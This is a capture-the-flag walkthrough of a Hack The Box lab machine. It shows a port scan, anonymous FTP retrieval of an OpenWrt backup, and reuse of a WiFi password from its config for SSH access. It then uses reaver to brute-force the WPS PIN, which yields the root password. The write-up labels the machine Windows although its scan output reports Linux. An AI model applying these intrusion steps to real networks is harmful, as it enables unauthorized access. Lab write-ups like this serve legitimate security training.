# HTB 

**Machine Information**

	IP : 10.10.11.247
	OS : Windows

### Reconnaissance

**Rustscan**

Start by running a port scan using `rustscan`.

```
rustscan -a 10.10.11.247 -- -sC -sV
```

```
PORT   STATE SERVICE    REASON  VERSION
21/tcp open  ftp        syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
53/tcp open  tcpwrapped syn-ack
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Getting a Foothold

**FTP**

The Nmap output shows that anonymous access is enabled for the FTP server and there are a few files to grab. Connect to the server and download all the files.

```
ftp 10.10.11.247
```

There is a `.tar` file that we can extract called `backup-OpenWrt-2023-07026.tar`. OpenWrt is an open-source project for wireless network devices. It is uses embedded operating systems based on Linux.

```
tar -xf backup-OpenWrt-2023-07026.tar
```

Inside appears to be the contents of the `/etc` directory for the underlying system. Check the `passwd` file to see potential usernames.

```
cat passwd
```

```
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false
```

**Configuration files**

Inside the `config` file are some more files that we can investigate. There is one called `wireless` that appears to contain the WiFi password.

```
cat config/wireless
```

Since we have usernames and a password we can see if these credentials were used elsewhere.

```
ssh netadmin@10.10.11.247
```

We successfully gain access and can retrieve the user flag.

```
cat user.txt
```

### Privilege Escalation

The machine information for this lab mentions having to crack the WPS PIN. A bit of googling finds the following article that shows the tool `reaver`.

<https://www.geeksforgeeks.org/brute-forcing-wps-pins-with-reaver-in-linux/>

Looking at the command we need an interface and MAC address which can be retrieved from checking network information.

```
ip a
```

There is already a network adaptor in monitoring mode.

```
7: mon0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 02:00:00:00:02:00 brd ff:ff:ff:ff:ff:ff
```

**Reaver**

Using this information we can start running `reaver` to crack the WPS PIN.

```
reaver -i mon0 -b 02:00:00:00:00:00 -S -v
```

**NOTE:** after waiting far too long I realised you need to use the MAC address for `wlan0`

This will reveal a password that we can try to reuse to access the `root` user.

```
su - root
```

Grab the flag.

```
cat root.txt
```
